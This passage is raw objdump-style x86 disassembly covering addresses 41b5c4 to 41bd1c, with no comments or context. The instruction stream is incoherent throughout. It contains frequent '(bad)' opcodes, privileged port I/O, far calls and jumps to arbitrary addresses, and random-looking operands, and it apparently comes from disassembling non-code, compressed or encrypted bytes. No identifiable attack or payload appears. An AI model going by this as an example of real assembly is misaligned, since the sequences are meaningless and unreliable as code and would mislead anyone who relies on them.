  41b5c4:	pop    eax
  41b5c5:	inc    eax
  41b5c6:	cld    
  41b5c7:	(bad)  
  41b5c8:	rol    BYTE PTR ds:0xb021b68b,0x96
  41b5cf:	frstor [ebx]
  41b5d1:	xor    DWORD PTR [ecx+0x27d782d4],0x1e361cdc
  41b5db:	mov    ebx,DWORD PTR [eax+ebx*4]
  41b5de:	ret    0xe357
  41b5e1:	test   BYTE PTR [eax+0x51],cl
  41b5e4:	mov    edi,0x8a0334e
  41b5e9:	clc    
  41b5ea:	push   ebp
  41b5eb:	xor    cl,bl
  41b5ed:	jo     0x41b63c
  41b5ef:	adc    dh,BYTE PTR [edi+0x3b567b00]
  41b5f5:	mov    BYTE PTR [edx-0x66],dh
  41b5f8:	xchg   al,dl
  41b5fa:	xor    al,0x80
  41b5fc:	lahf   
  41b5fd:	push   ebp
  41b5fe:	sbb    BYTE PTR [eax-0x61],ah
  41b601:	and    DWORD PTR [edx-0x3824d6fa],edx
  41b607:	je     0x41b58a
  41b609:	stos   DWORD PTR es:[edi],eax
  41b60a:	mov    al,ds:0x37f7c6f7
  41b60f:	lods   al,BYTE PTR ds:[esi]
  41b610:	mov    bl,0xc8
  41b612:	mov    esi,0x12fda56d
  41b617:	jecxz  0x41b5ce
  41b619:	dec    edx
  41b61a:	xchg   edi,eax
  41b61b:	jg     0x41b5ac
  41b61d:	xchg   dh,cl
  41b61f:	xchg   ebp,eax
  41b620:	(bad)  
  41b621:	mul    dh
  41b623:	outs   dx,DWORD PTR ds:[esi]
  41b624:	scas   eax,DWORD PTR es:[edi]
  41b625:	ja     0x41b5e2
  41b627:	jmp    0x41b65c
  41b629:	les    ecx,FWORD PTR [ebp-0xd00cda]
  41b62f:	jg     0x41b5ce
  41b631:	push   ebx
  41b633:	sub    BYTE PTR [esi],dh
  41b635:	xor    ebx,edx
  41b637:	cmp    al,0xe6
  41b639:	jl     0x41b5ca
  41b63b:	cmp    eax,0xccf64d4f
  41b640:	lock rep ins DWORD PTR es:[edi],dx
  41b643:	xor    eax,0xd92daa7b
  41b648:	repz mov bh,0x73
  41b64b:	mov    dl,0xcd
  41b64d:	mov    ss,edx
  41b64f:	sar    BYTE PTR [edx+0x5fca6812],1
  41b655:	xchg   edx,eax
  41b656:	jg     0x41b5f8
  41b658:	scas   eax,DWORD PTR es:[edi]
  41b659:	mov    ebx,0xdc591a93
  41b65e:	call   0x90b1:0x941d6cbd
  41b665:	imul   eax,DWORD PTR [ebx-0x7e],0x49
  41b669:	dec    ebp
  41b66a:	ja     0x41b65e
  41b66c:	sub    al,0x3
  41b66e:	jg     0x41b633
  41b670:	outs   dx,DWORD PTR ds:[esi]
  41b671:	pop    esi
  41b672:	mov    BYTE PTR [ecx-0x71e1ff09],ch
  41b678:	cli    
  41b679:	sbb    al,0xd7
  41b67b:	push   0x9a120dfe
  41b680:	add    esi,DWORD PTR [ecx]
  41b682:	pop    eax
  41b683:	push   edx
  41b684:	stc    
  41b685:	not    BYTE PTR [edx-0x58]
  41b688:	iret   
  41b689:	mov    al,0xe
  41b68b:	jno    0x41b68d
  41b68d:	jns    0x41b616
  41b68f:	rol    BYTE PTR [ebp+0x7ba90219],cl
  41b695:	pop    ebx
  41b696:	lahf   
  41b697:	pop    esi
  41b698:	lock pusha 
  41b69a:	push   ebx
  41b69b:	xor    al,0xbb
  41b69d:	jmp    0xbc7964a7
  41b6a2:	mov    ebx,0xa1b99658
  41b6a7:	mov    ebp,0x9671e660
  41b6ac:	adc    DWORD PTR [eax],0xffffffe1
  41b6af:	jne    0x41b65b
  41b6b1:	(bad)  
  41b6b2:	das    
  41b6b3:	out    0x1f,eax
  41b6b5:	inc    esi
  41b6b6:	in     eax,0x8b
  41b6b8:	fnstcw WORD PTR [edx]
  41b6ba:	pop    DWORD PTR [ebp+0x8dac71e]
  41b6c0:	jne    0x41b6f7
  41b6c2:	adc    ch,al
  41b6c4:	jg     0x41b718
  41b6c6:	xlat   BYTE PTR ds:[ebx]
  41b6c7:	imul   ecx,esp,0x8c73fe12
  41b6cd:	mov    al,ds:0x1aba22ef
  41b6d2:	adc    al,0xe6
  41b6d4:	pop    eax
  41b6d5:	dec    ebx
  41b6d6:	sub    BYTE PTR [eax],al
  41b6d8:	or     DWORD PTR [ebx-0x22],esi
  41b6db:	pusha  
  41b6dc:	out    dx,al
  41b6dd:	out    0xda,al
  41b6df:	sahf   
  41b6e0:	mov    al,ds:0xe0676d67
  41b6e5:	xor    eax,0x69d98126
  41b6ea:	mov    al,ds:0x58f28fb9
  41b6ef:	xlat   BYTE PTR ds:[ebx]
  41b6f0:	dec    edx
  41b6f1:	out    0xb3,eax
  41b6f3:	push   ebp
  41b6f5:	mov    bl,0x9c
  41b6f7:	test   eax,0xf2dd1f98
  41b6fc:	fimul  WORD PTR [ebx+0x38c3c4b4]
  41b702:	jo     0x41b714
  41b704:	stc    
  41b705:	jmp    0x3ab38db0
  41b70a:	mov    dl,0x75
  41b70c:	cmp    dh,BYTE PTR [eax+0xd]
  41b70f:	movsx  ecx,WORD PTR ds:[ebx+0x43]
  41b714:	(bad)  
  41b715:	dec    esp
  41b716:	inc    edi
  41b717:	int3   
  41b718:	lods   eax,DWORD PTR ds:[esi]
  41b719:	sub    BYTE PTR [ebx+ebx*4+0x69b11b6d],al
  41b720:	inc    edi
  41b721:	inc    ecx
  41b722:	mov    cl,0xb9
  41b724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b725:	add    al,0x3f
  41b727:	mov    dl,0xc0
  41b729:	pop    esi
  41b72a:	cmc    
  41b72b:	enter  0xb25a,0xfb
  41b72f:	lea    ebp,[edx]
  41b731:	scas   eax,DWORD PTR es:[edi]
  41b732:	and    DWORD PTR [eax-0x4841f345],edi
  41b738:	pusha  
  41b739:	fwait
  41b73a:	cs cli 
  41b73c:	pop    edx
  41b73d:	jg     0x41b713
  41b73f:	and    ecx,DWORD PTR [ecx+0x8]
  41b742:	sahf   
  41b743:	pop    ecx
  41b744:	or     BYTE PTR [ebp+0x6f],0xe2
  41b748:	mov    esi,0x126c0387
  41b74d:	adc    edx,DWORD PTR [ebp-0x14c1c9b0]
  41b753:	and    bh,0xcf
  41b756:	xchg   BYTE PTR [eax-0x49],dl
  41b759:	dec    edx
  41b75a:	sub    BYTE PTR [eax],bl
  41b75c:	pop    esp
  41b75d:	xchg   ecx,eax
  41b75e:	dec    edx
  41b75f:	outs   dx,BYTE PTR ds:[esi]
  41b760:	retf   0x3371
  41b763:	mov    cl,0xb3
  41b765:	call   0xc726f9ca
  41b76a:	retf   0x6e7e
  41b76d:	pop    ebp
  41b76e:	dec    edx
  41b76f:	push   cs
  41b770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b771:	jno    0x41b71f
  41b773:	or     BYTE PTR [edi-0x3582065d],bh
  41b779:	(bad)  
  41b77a:	push   ebp
  41b77b:	push   esi
  41b77c:	sbb    eax,0x5d80e18e
  41b781:	pop    esp
  41b782:	add    edi,edi
  41b784:	or     al,0x58
  41b786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b787:	fucom  st(4)
  41b789:	div    DWORD PTR [edi+0x2d3491f3]
  41b78f:	cmp    DWORD PTR [eax-0x6fb3ac62],0xffffff86
  41b796:	sti    
  41b797:	add    DWORD PTR [ebp+edi*4+0x3455871b],ebx
  41b79e:	jns    0x41b735
  41b7a0:	cdq    
  41b7a1:	xchg   edx,eax
  41b7a2:	int3   
  41b7a3:	fcomp  DWORD PTR [esi]
  41b7a5:	or     al,0x81
  41b7a7:	lds    esi,FWORD PTR [esi+ecx*1+0x1a]
  41b7ab:	dec    eax
  41b7ac:	out    dx,al
  41b7ad:	push   esp
  41b7ae:	dec    ecx
  41b7af:	pushf  
  41b7b0:	jge    0x41b81a
  41b7b2:	sbb    al,dh
  41b7b4:	jmp    0xf6227eb6
  41b7b9:	test   eax,0x796b574b
  41b7be:	mov    dh,0x84
  41b7c0:	dec    ecx
  41b7c1:	cmp    edx,DWORD PTR [ebp-0x3f4fcb35]
  41b7c7:	push   esi
  41b7c8:	jne    0x41b82a
  41b7ca:	jle    0x41b7db
  41b7cc:	fadd   QWORD PTR [ecx]
  41b7ce:	shr    ebx,cl
  41b7d0:	or     eax,0x99a0350c
  41b7d5:	mov    bl,0x58
  41b7d7:	mov    DWORD PTR [eax],ebp
  41b7d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7da:	xor    ebx,DWORD PTR [eax-0x64]
  41b7dd:	bound  ebp,QWORD PTR [ebx]
  41b7df:	jle    0x41b81b
  41b7e1:	adc    BYTE PTR [eax],dl
  41b7e3:	div    bh
  41b7e5:	lock mov esi,0xc7320a8b
  41b7eb:	add    BYTE PTR [edx],dl
  41b7ed:	sbb    ah,bl
  41b7ef:	pop    ebp
  41b7f0:	add    BYTE PTR [ebp-0x26],bh
  41b7f3:	jo     0x41b7c4
  41b7f5:	into   
  41b7f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7f7:	je     0x41b854
  41b7f9:	mov    BYTE PTR [ebp-0x2fa89fbd],bl
  41b7ff:	and    bl,BYTE PTR [edx]
  41b801:	sahf   
  41b802:	and    DWORD PTR [ecx-0x1f2de103],ebp
  41b808:	push   ebp
  41b809:	ds cmp eax,0x5b52ee88
  41b80f:	inc    ebp
  41b810:	scas   al,BYTE PTR es:[edi]
  41b811:	sti    
  41b812:	push   ebp
  41b813:	mov    eax,0xb7d91f2e
  41b818:	(bad)  
  41b819:	lock scas al,BYTE PTR es:[edi]
  41b81b:	arpl   WORD PTR [ecx],ax
  41b81d:	call   0xeaba:0x5f760e5
  41b824:	sub    DWORD PTR [edi-0x68],0x75
  41b828:	out    dx,eax
  41b829:	test   DWORD PTR [ebp-0x50656348],edx
  41b82f:	fs call 0x4f85:0xa4300c6
  41b837:	mov    ecx,0x5c260022
  41b83c:	or     al,0xe4
  41b83e:	mov    edx,0xa72ef49
  41b843:	adc    BYTE PTR [edx-0x3a],dl
  41b846:	aaa    
  41b847:	pop    ebx
  41b848:	push   ecx
  41b849:	jge    0x41b856
  41b84b:	adc    ebp,ecx
  41b84d:	xor    al,0x3c
  41b84f:	loope  0x41b8a7
  41b851:	inc    esi
  41b852:	(bad)  
  41b853:	push   ss
  41b854:	mov    ch,0x4
  41b856:	jbe    0x41b808
  41b858:	(bad)  
  41b859:	push   esp
  41b85a:	shr    bh,1
  41b85c:	cmp    DWORD PTR [esi-0xc],0xffffffcb
  41b860:	inc    ebx
  41b861:	sbb    BYTE PTR [ecx],dl
  41b863:	iret   
  41b864:	push   0x13864bae
  41b869:	xchg   BYTE PTR [edi-0x733fadb],dh
  41b86f:	dec    ecx
  41b870:	xchg   BYTE PTR [edi+0x46c400e2],cl
  41b876:	pop    ss
  41b877:	call   0xb2c2:0xa2d6b0ef
  41b87e:	sbb    BYTE PTR [ebp+0x42153022],dh
  41b884:	pusha  
  41b885:	pop    edx
  41b886:	fiadd  DWORD PTR [ecx-0x22]
  41b889:	pop    esi
  41b88a:	or     al,0x54
  41b88c:	js     0x41b882
  41b88e:	es mov dl,0x88
  41b891:	cmp    BYTE PTR [esi+ebx*2-0xaabbef7],dh
  41b898:	xor    DWORD PTR [edi+0x53684f85],esp
  41b89e:	adc    bl,bh
  41b8a0:	cmp    eax,0x54696c2a
  41b8a5:	lock repnz hlt 
  41b8a8:	dec    eax
  41b8a9:	jno    0x41b82d
  41b8ab:	pop    es
  41b8ac:	sti    
  41b8ad:	ds pop ecx
  41b8af:	push   ebp
  41b8b0:	sbb    DWORD PTR [ebx-0x6c],esp
  41b8b3:	add    esi,DWORD PTR [esi]
  41b8b5:	push   edi
  41b8b6:	gs ins BYTE PTR es:[edi],dx
  41b8b8:	fsubr  DWORD PTR [esi+0x59a3fe5c]
  41b8be:	and    ebx,DWORD PTR [ebp+ebp*8-0x80]
  41b8c2:	test   DWORD PTR [ecx+ebp*2+0x3f13ddc4],edx
  41b8c9:	or     DWORD PTR [edx-0x1b],0xfffffff3
  41b8cd:	call   0x819b8f9c
  41b8d2:	mov    ecx,DWORD PTR [edi]
  41b8d4:	cwde   
  41b8d5:	mov    bh,0xce
  41b8d7:	out    0x10,eax
  41b8d9:	dec    ecx
  41b8da:	or     DWORD PTR [ebx],0x5ca14305
  41b8e0:	sbb    esp,DWORD PTR [edx-0x3424e713]
  41b8e6:	inc    esi
  41b8e7:	jge    0x41b8d0
  41b8e9:	xchg   ebx,eax
  41b8ea:	lods   al,BYTE PTR ds:[esi]
  41b8eb:	(bad)  
  41b8ed:	inc    ebx
  41b8ee:	in     eax,dx
  41b8ef:	pushw  ss
  41b8f1:	adc    BYTE PTR [eax-0x13],dh
  41b8f4:	mov    es,ebp
  41b8f6:	sbb    ecx,DWORD PTR [edi-0x1a72ded0]
  41b8fc:	mov    cl,0x61
  41b8fe:	push   0x7c805800
  41b903:	mov    esi,0x3d0dc219
  41b908:	(bad)  
  41b909:	lea    esi,[edx+edi*8-0x1581f0c6]
  41b910:	xor    DWORD PTR [edx-0x73d28712],esi
  41b916:	mov    DWORD PTR [esi-0x26],edi
  41b919:	sar    esi,1
  41b91b:	stc    
  41b91c:	jae    0x41b8ae
  41b91e:	add    al,BYTE PTR [ebx+esi*8]
  41b921:	mov    al,ds:0xb4777691
  41b926:	aad    0x78
  41b928:	mov    eax,0xcd18b195
  41b92d:	ja     0x41b91d
  41b92f:	loop   0x41b91e
  41b931:	fadd   st(6),st
  41b933:	into   
  41b934:	adc    eax,0xe0ae4bb9
  41b939:	xchg   edi,eax
  41b93a:	adc    DWORD PTR [eax],edx
  41b93c:	std    
  41b93d:	cmp    dh,bh
  41b93f:	push   0x587c1245
  41b944:	sub    al,0xeb
  41b946:	ins    DWORD PTR es:[edi],dx
  41b947:	shl    dh,0x5f
  41b94a:	loopne 0x41b905
  41b94c:	cmc    
  41b94d:	or     DWORD PTR [edi-0x1dc07c5],0xffffff9c
  41b954:	mov    cl,0x6c
  41b956:	pop    es
  41b957:	ja     0x41b8fd
  41b959:	jecxz  0x41b95c
  41b95b:	cmp    ch,cl
  41b95d:	test   BYTE PTR [ecx-0x4b3a1c87],dl
  41b963:	sub    al,0x75
  41b965:	inc    edi
  41b966:	inc    edx
  41b967:	mov    edx,0x9736a6e4
  41b96c:	sbb    BYTE PTR [edi+0x62],ah
  41b96f:	stos   DWORD PTR es:[edi],eax
  41b970:	dec    ebx
  41b971:	ss hlt 
  41b973:	popa   
  41b974:	out    dx,eax
  41b975:	shr    DWORD PTR [eax+0x4d],0x18
  41b979:	and    cl,ah
  41b97b:	sub    al,0xe8
  41b97d:	mov    bl,0xb6
  41b97f:	add    al,0xe0
  41b981:	in     eax,0x9d
  41b983:	lahf   
  41b984:	rcr    DWORD PTR [ecx+0x691aa22c],cl
  41b98a:	push   edi
  41b98b:	aas    
  41b98c:	fiadd  DWORD PTR [ecx]
  41b98e:	pop    ebp
  41b98f:	in     eax,dx
  41b990:	push   ecx
  41b991:	xchg   esi,eax
  41b992:	xchg   esi,eax
  41b993:	lea    edi,[ebx+0x2b564282]
  41b999:	in     eax,dx
  41b99a:	jg     0x41b9ff
  41b99c:	push   edi
  41b99d:	pop    ebx
  41b99e:	mov    eax,0xae2fd7dc
  41b9a3:	and    bl,0x9b
  41b9a6:	test   BYTE PTR [eax],bh
  41b9a8:	ins    BYTE PTR es:[edi],dx
  41b9a9:	lods   al,BYTE PTR ds:[esi]
  41b9aa:	jl     0x41b9f4
  41b9ac:	es dec ecx
  41b9ae:	dec    edi
  41b9af:	and    bh,BYTE PTR [esi-0x2f177bcc]
  41b9b5:	mov    bl,cl
  41b9b7:	push   esi
  41b9b8:	xchg   esp,eax
  41b9b9:	mov    ds:0xd5a21c0a,eax
  41b9be:	dec    ebx
  41b9bf:	cmc    
  41b9c0:	sub    al,0x99
  41b9c2:	je     0x41b954
  41b9c4:	mov    ds:0x8c4f3f59,al
  41b9c9:	pop    ss
  41b9ca:	jae    0x41b991
  41b9cc:	pop    es
  41b9cd:	aad    0x19
  41b9cf:	lods   al,BYTE PTR ds:[esi]
  41b9d0:	mov    bl,0x39
  41b9d2:	mov    eax,ds:0x985c18fd
  41b9d7:	lahf   
  41b9d8:	inc    ebp
  41b9d9:	mov    eax,0x26d8d88
  41b9de:	sar    DWORD PTR [edx],cl
  41b9e0:	or     esi,DWORD PTR [eax+0x6b99b860]
  41b9e6:	shr    BYTE PTR [eax+0x2e],cl
  41b9e9:	das    
  41b9ea:	adc    dh,BYTE PTR [ebx]
  41b9ec:	cdq    
  41b9ed:	popf   
  41b9ee:	mov    ah,BYTE PTR [ebx]
  41b9f0:	cwde   
  41b9f1:	sub    dh,BYTE PTR [esi]
  41b9f3:	std    
  41b9f4:	test   BYTE PTR [ecx-0x3a4a70d0],dh
  41b9fa:	mov    ebp,0x5d41cbe6
  41b9ff:	call   0x2bb1e2c5
  41ba04:	push   ecx
  41ba05:	jp     0x41ba0c
  41ba07:	mov    bl,0x98
  41ba09:	and    edi,ecx
  41ba0b:	add    cl,dh
  41ba0d:	mov    dh,0xa8
  41ba0f:	push   ds
  41ba10:	mov    ebx,0x92c5eb23
  41ba15:	sahf   
  41ba16:	(bad)  
  41ba17:	mov    al,ds:0xd6ffa25c
  41ba1c:	jo     0x41b9e1
  41ba1e:	or     DWORD PTR [esi+0x15],ebp
  41ba21:	and    al,0x8a
  41ba23:	cmp    al,0x4a
  41ba25:	sub    bh,BYTE PTR [ebp-0x29]
  41ba28:	nop
  41ba29:	or     eax,0xe7dc2350
  41ba2e:	mov    al,0x72
  41ba30:	mov    ds:0x6d7224e5,al
  41ba35:	imul   ebx,DWORD PTR [ebx+0xdf6ef07],0x7c98c372
  41ba3f:	inc    edi
  41ba40:	aaa    
  41ba41:	call   0xd860d44f
  41ba46:	nop
  41ba47:	pop    edi
  41ba48:	inc    ebp
  41ba49:	hlt    
  41ba4a:	data16 ds ja 0x41ba93
  41ba4e:	mov    ds:0xb45086b5,eax
  41ba53:	add    ch,cl
  41ba55:	stos   BYTE PTR es:[edi],al
  41ba56:	clc    
  41ba57:	ret    
  41ba58:	popf   
  41ba59:	lock pop esi
  41ba5b:	push   ss
  41ba5c:	xchg   bx,ax
  41ba5e:	push   es
  41ba5f:	leave  
  41ba60:	cmp    eax,0xe789ceb6
  41ba65:	sub    DWORD PTR [ecx+0x51b68949],edi
  41ba6b:	mov    al,ds:0x313b62cd
  41ba70:	pop    ds
  41ba71:	jne    0x41ba76
  41ba73:	pop    esi
  41ba74:	or     edx,edi
  41ba76:	mov    edi,0x5f21857d
  41ba7b:	mov    bh,0x9c
  41ba7d:	loop   0x41ba4c
  41ba7f:	push   edi
  41ba80:	jno    0x41bafe
  41ba82:	xchg   esp,eax
  41ba83:	ficomp WORD PTR [eax]
  41ba85:	scas   al,BYTE PTR es:[edi]
  41ba86:	(bad)  
  41ba87:	js     0x41ba2b
  41ba89:	(bad)  
  41ba8a:	aaa    
  41ba8b:	fist   WORD PTR [eax+0x68bfe89a]
  41ba91:	mov    bl,0xe3
  41ba93:	add    bh,BYTE PTR [edx]
  41ba95:	lds    edx,FWORD PTR [ebx]
  41ba97:	repnz mov edx,0xf4728db0
  41ba9d:	jne    0x41bac8
  41ba9f:	outs   dx,BYTE PTR ds:[esi]
  41baa0:	or     bl,dh
  41baa2:	inc    bl
  41baa4:	jb     0x41ba66
  41baa6:	dec    edi
  41baa7:	pop    DWORD PTR [esi+0x26]
  41baaa:	fmul   DWORD PTR [ebx]
  41baac:	lods   al,BYTE PTR ds:[esi]
  41baad:	pop    esi
  41baae:	dec    eax
  41baaf:	in     al,dx
  41bab0:	inc    eax
  41bab1:	daa    
  41bab2:	jmp    0x41ba9a
  41bab4:	bnd jg 0x41bad9
  41bab7:	lea    esp,[esi+ebx*2]
  41baba:	cmp    al,0x5f
  41babc:	dec    edx
  41babd:	stos   BYTE PTR es:[edi],al
  41babe:	cmp    DWORD PTR [ebp-0x5a22549c],esi
  41bac4:	cmp    DWORD PTR [eax+0x23229b3],0x20
  41bacb:	rcr    BYTE PTR [esi-0x62],cl
  41bace:	add    BYTE PTR [eax],0x47
  41bad1:	dec    ebp
  41bad2:	sub    ebp,DWORD PTR [ebp-0x51]
  41bad5:	fst    QWORD PTR ds:0xc5a16687
  41badb:	jecxz  0x41ba91
  41badd:	jp     0x41bab2
  41badf:	aaa    
  41bae0:	ret    
  41bae1:	adc    bl,BYTE PTR [edi-0x887cd0e]
  41bae7:	mov    ds:0x3f524683,al
  41baec:	xchg   ecx,eax
  41baed:	xchg   BYTE PTR [edx],al
  41baef:	out    0xe2,eax
  41baf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baf2:	mov    esp,0x4f00a49e
  41baf7:	int3   
  41baf8:	imul   ebp,DWORD PTR [ebx-0x3688363],0x3d
  41baff:	push   esi
  41bb00:	in     al,0x69
  41bb02:	xchg   esp,eax
  41bb03:	mov    ebx,0x590b70b1
  41bb08:	mov    esi,es
  41bb0a:	pusha  
  41bb0b:	push   ss
  41bb0c:	dec    eax
  41bb0d:	pop    ecx
  41bb0e:	cli    
  41bb0f:	mov    edx,0x93b50622
  41bb14:	test   eax,0x9fade6fc
  41bb19:	or     ah,BYTE PTR ds:0x4a4c839f
  41bb1f:	sbb    BYTE PTR [ebx],cl
  41bb21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb22:	inc    edx
  41bb23:	nop
  41bb24:	add    bh,ch
  41bb26:	loopne 0x41bb55
  41bb28:	fwait
  41bb29:	cld    
  41bb2a:	pop    esp
  41bb2b:	xor    edx,DWORD PTR [ebp-0x2d]
  41bb2e:	ret    0x46ae
  41bb31:	dec    edx
  41bb32:	call   0x7829533b
  41bb37:	jne    0x41bb52
  41bb39:	pop    ebp
  41bb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb3b:	pop    ebx
  41bb3c:	hlt    
  41bb3d:	inc    edx
  41bb3e:	mov    dh,0x27
  41bb40:	les    esi,FWORD PTR [eax]
  41bb42:	pop    es
  41bb43:	std    
  41bb44:	dec    ecx
  41bb45:	mov    cl,BYTE PTR [ebx+0x5ddc6144]
  41bb4b:	jno    0x41bb14
  41bb4d:	out    0x75,eax
  41bb4f:	mov    cl,0x7f
  41bb51:	mov    al,ds:0xee0231b
  41bb56:	retf   
  41bb57:	sbb    si,di
  41bb5a:	sbb    bh,BYTE PTR [esi+0x31]
  41bb5d:	out    0xbe,al
  41bb5f:	cs push edi
  41bb61:	mov    esi,0xa06cc4e
  41bb66:	dec    ebx
  41bb67:	gs iret 
  41bb69:	push   ebp
  41bb6a:	cmp    esp,DWORD PTR [ebx]
  41bb6c:	add    al,0x72
  41bb6e:	inc    esi
  41bb6f:	dec    ecx
  41bb70:	into   
  41bb71:	cwde   
  41bb72:	ror    DWORD PTR [edx],0x1d
  41bb75:	add    edi,DWORD PTR [eax]
  41bb77:	xchg   edx,eax
  41bb78:	mov    eax,0x737eefc3
  41bb7d:	push   esp
  41bb7e:	pop    ebp
  41bb7f:	aad    0x46
  41bb81:	shr    DWORD PTR [eax],1
  41bb83:	lods   eax,DWORD PTR ds:[esi]
  41bb84:	or     al,0x6b
  41bb86:	xchg   ah,ah
  41bb88:	and    eax,0xe6e8187b
  41bb8d:	adc    BYTE PTR [esi+0x2d34a26f],dl
  41bb93:	push   0x247f0d9f
  41bb98:	jmp    0x7e45d574
  41bb9d:	push   esi
  41bb9e:	(bad)  
  41bb9f:	jns    0x41bbf7
  41bba1:	mov    cl,0x5d
  41bba3:	push   ebx
  41bba4:	push   edi
  41bba5:	call   0xbe6:0xbfe0785c
  41bbac:	push   0xd7a90340
  41bbb1:	inc    edx
  41bbb2:	les    edi,FWORD PTR [eax+0xc]
  41bbb5:	rcl    BYTE PTR [esi+0x1d31501c],0xc2
  41bbbc:	ret    
  41bbbd:	ret    
  41bbbe:	pop    esi
  41bbbf:	imul   edx,ebx,0x2e
  41bbc2:	int3   
  41bbc3:	mov    WORD PTR [eax+eax*2-0x46],?
  41bbc7:	in     al,0xff
  41bbc9:	pop    ecx
  41bbca:	fld    TBYTE PTR [ebp+0x50ddc8b4]
  41bbd0:	rol    BYTE PTR [ecx+0x8],cl
  41bbd3:	xor    al,0x82
  41bbd5:	pop    ebp
  41bbd6:	jg     0x41bbcf
  41bbd8:	jae    0x41bba7
  41bbda:	imul   ebx,DWORD PTR [eax+esi*8+0x324350a8],0xffffff95
  41bbe2:	loope  0x41bba1
  41bbe4:	xchg   esi,eax
  41bbe5:	out    0xcb,al
  41bbe7:	sahf   
  41bbe8:	jae    0x41bc02
  41bbea:	ins    DWORD PTR es:[edi],dx
  41bbeb:	and    bh,ah
  41bbed:	pop    ecx
  41bbee:	aad    0x1e
  41bbf0:	fist   WORD PTR [esi]
  41bbf2:	cli    
  41bbf3:	add    esp,DWORD PTR ss:[eax-0x6e3f0367]
  41bbfa:	icebp  
  41bbfb:	xor    ebx,DWORD PTR [edx+0x18]
  41bbfe:	ja     0x41bc69
  41bc00:	xchg   esp,eax
  41bc01:	xor    eax,0xe5523e4f
  41bc06:	add    al,0x1
  41bc08:	mov    BYTE PTR [edi+0x7ed3127e],0xe5
  41bc0f:	jmp    0x41bc8d
  41bc11:	fmul   QWORD PTR [ecx-0x7a]
  41bc14:	fdivr  QWORD PTR [edi+0x74b39cf0]
  41bc1a:	mov    fs,WORD PTR [edi-0x79]
  41bc1d:	xor    eax,0x36039085
  41bc22:	retf   
  41bc23:	add    al,0xac
  41bc25:	and    BYTE PTR [ecx-0x489b78ba],bl
  41bc2b:	addr16 pop edx
  41bc2d:	xchg   ebx,eax
  41bc2e:	inc    eax
  41bc2f:	pop    esp
  41bc30:	int3   
  41bc31:	adc    eax,0x2dc2c255
  41bc36:	sub    dl,0x2b
  41bc39:	(bad)  
  41bc3a:	adc    al,BYTE PTR [ebx]
  41bc3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc3d:	hlt    
  41bc3e:	or     dl,BYTE PTR [eax]
  41bc40:	dec    esp
  41bc41:	push   ebp
  41bc42:	das    
  41bc43:	inc    ebx
  41bc44:	(bad)  
  41bc45:	cmp    eax,0xc33df15
  41bc4a:	out    0x64,eax
  41bc4c:	test   eax,0xda3f6d98
  41bc51:	outs   dx,DWORD PTR ds:[esi]
  41bc52:	arpl   WORD PTR [ecx],sp
  41bc54:	(bad)  
  41bc55:	jle    0x41bc63
  41bc57:	mov    eax,ds:0x5d6b8918
  41bc5c:	mov    es,WORD PTR [esi-0x5c053084]
  41bc62:	mov    gs,WORD PTR [ecx+0x16f598d]
  41bc68:	mov    bh,0xdc
  41bc6a:	xchg   esi,eax
  41bc6b:	mov    WORD PTR [ebx],?
  41bc6d:	jmp    0x1b6c:0xf777810
  41bc74:	ret    0x14cf
  41bc77:	jl     0x41bc0d
  41bc79:	in     al,dx
  41bc7a:	mov    al,ds:0x90262938
  41bc7f:	xchg   edx,eax
  41bc80:	popf   
  41bc81:	ret    0x7592
  41bc84:	gs das 
  41bc86:	xchg   ebp,eax
  41bc87:	test   DWORD PTR [eax+eiz*1],ecx
  41bc8a:	adc    BYTE PTR [edi+0x4a],ch
  41bc8d:	dec    eax
  41bc8e:	push   eax
  41bc8f:	and    eax,0x7cd3e716
  41bc94:	imul   edi,DWORD PTR [edi],0x7d
  41bc97:	fs (bad) 
  41bc99:	lds    edx,FWORD PTR [eax+0x2a]
  41bc9c:	cmovle eax,esi
  41bc9f:	(bad)  
  41bca1:	inc    ebx
  41bca2:	std    
  41bca3:	das    
  41bca4:	dec    esi
  41bca5:	sub    eax,0x9f61bb12
  41bcaa:	push   0x35a05c87
  41bcaf:	test   edx,esi
  41bcb1:	xor    al,0x73
  41bcb3:	xor    bl,dh
  41bcb5:	adc    BYTE PTR [ebp+0x6a2f5988],cl
  41bcbb:	mov    ah,0x0
  41bcbd:	fwait
  41bcbe:	xor    al,0x32
  41bcc0:	add    eax,0xb367ca0a
  41bcc5:	mov    cl,0xbe
  41bcc7:	mov    bh,0x9c
  41bcc9:	das    
  41bcca:	pop    es
  41bccb:	mov    bh,0x90
  41bccd:	lahf   
  41bcce:	or     ebx,DWORD PTR [edx+0x19]
  41bcd1:	lods   al,BYTE PTR ds:[esi]
  41bcd2:	in     al,0x32
  41bcd4:	in     al,0xba
  41bcd6:	pop    eax
  41bcd7:	ins    BYTE PTR es:[edi],dx
  41bcd8:	test   al,0xe4
  41bcda:	inc    ebp
  41bcdb:	inc    eax
  41bcdc:	pop    edi
  41bcdd:	inc    ebx
  41bcde:	sub    bh,BYTE PTR [edi+0x7923a4a8]
  41bce4:	test   BYTE PTR [edi],bl
  41bce6:	cdq    
  41bce7:	mov    al,0x2b
  41bce9:	mov    cs,edi
  41bceb:	push   ebp
  41bcec:	in     al,0xd9
  41bcee:	push   es
  41bcef:	arpl   WORD PTR [esi+0x50],ax
  41bcf2:	cs push 0xafaaae62
  41bcf8:	loop   0x41bd06
  41bcfa:	xcrypt-ofb (bad)
  41bcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcfc:	ins    DWORD PTR es:[edi],dx
  41bcfd:	mov    ebx,DWORD PTR [edx+0x4b]
  41bd00:	push   ecx
  41bd01:	pop    es
  41bd02:	add    cl,al
  41bd04:	sti    
  41bd05:	pop    ecx
  41bd06:	les    edi,FWORD PTR [ecx+0xe2ac60e]
  41bd0c:	mov    edi,0x5896bfac
  41bd11:	icebp  
  41bd12:	inc    edx
  41bd13:	ret    
  41bd14:	xchg   ecx,eax
  41bd15:	inc    edi
  41bd16:	mov    ebp,0xb481a3ff
  41bd1b:	cwde   
  41bd1c:	jmp    0x6e1695e9
